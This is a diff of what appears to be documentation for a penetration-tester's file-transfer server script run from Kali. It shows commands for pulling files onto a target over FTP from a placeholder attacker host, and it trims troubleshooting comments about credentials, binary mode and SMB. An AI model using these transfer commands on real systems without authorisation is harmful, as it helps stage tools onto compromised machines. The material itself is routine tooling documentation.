@@ -154,8 +154,6 @@ wget ftp://kali:kali@KALI_IP:21/FILE
 
 # Windows target (cmd.exe)
 ftp KALI_IP
-# Prompt: user=kali pass=kali
-# Set binary mode: binary
 # Then: get FILE
 ```
 
@@ -274,14 +272,8 @@ sudo ./servr.sh http
 
 # impacket-smbserver not found
 sudo apt install python3-impacket
-# or: pip install impacket --break-system-packages
-
 # pyftpdlib not found (FTP mode)
 pip install pyftpdlib --break-system-packages
-
-# SMB connection refused on Windows — SMBv1 blocked
-# impacket-smbserver uses -smb2support by default — should work
-# If still failing, try HTTP or FTP instead
 
 # Port already in use
 ss -tlnp | grep ':445'
